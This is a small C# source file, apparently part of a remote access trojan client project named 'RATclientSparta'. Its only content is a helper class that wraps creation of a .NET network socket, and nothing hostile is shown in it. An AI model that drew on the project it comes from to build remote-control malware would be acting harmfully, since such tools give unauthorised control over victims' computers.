using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace RATclientSparta.Socket
{
    public class Socket
    {
        public static System.Net.Sockets.Socket Set(AddressFamily data, SocketType value, ProtocolType Protocol)
        {
            return new System.Net.Sockets.Socket(data, value, Protocol);
        }
    }
}
